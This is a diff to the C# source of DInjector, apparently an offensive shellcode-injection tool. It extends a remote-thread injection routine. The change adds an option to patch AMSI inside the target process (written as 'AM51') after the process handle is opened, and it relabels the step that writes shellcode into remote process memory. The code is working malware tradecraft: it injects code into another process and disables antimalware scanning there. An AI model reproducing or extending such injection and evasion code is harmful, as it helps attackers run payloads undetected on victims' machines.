@@ -8,7 +8,7 @@ namespace DInjector
 {
     class RemoteThreadSuspended
     {
-        public static void Execute(byte[] shellcode, int processID, int flipSleep)
+        public static void Execute(byte[] shellcode, int processID, int flipSleep, bool remoteAm51)
         {
             #region NtOpenProcess
 
@@ -26,6 +26,8 @@ namespace DInjector
                 Console.WriteLine("(RemoteThreadSuspended) [+] NtOpenProcess");
             else
                 throw new Exception($"(RemoteThreadSuspended) [-] NtOpenProcess: {ntstatus}");
+
+            if (remoteAm51) AM51.Patch(hProcess, processID);
 
             #endregion
 
@@ -49,7 +51,7 @@ namespace DInjector
 
             #endregion
 
-            #region NtWriteVirtualMemory
+            #region NtWriteVirtualMemory (shellcode)
 
             var buffer = Marshal.AllocHGlobal(shellcode.Length);
             Marshal.Copy(shellcode, 0, buffer, shellcode.Length);
@@ -64,9 +66,9 @@ namespace DInjector
                 ref bytesWritten);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(RemoteThreadSuspended) [+] NtWriteVirtualMemory");
+                Console.WriteLine("(RemoteThreadSuspended) [+] NtWriteVirtualMemory, shellcode");
             else
-                throw new Exception($"(RemoteThreadSuspended) [-] NtWriteVirtualMemory: {ntstatus}");
+                throw new Exception($"(RemoteThreadSuspended) [-] NtWriteVirtualMemory, shellcode: {ntstatus}");
 
             Marshal.FreeHGlobal(buffer);
 
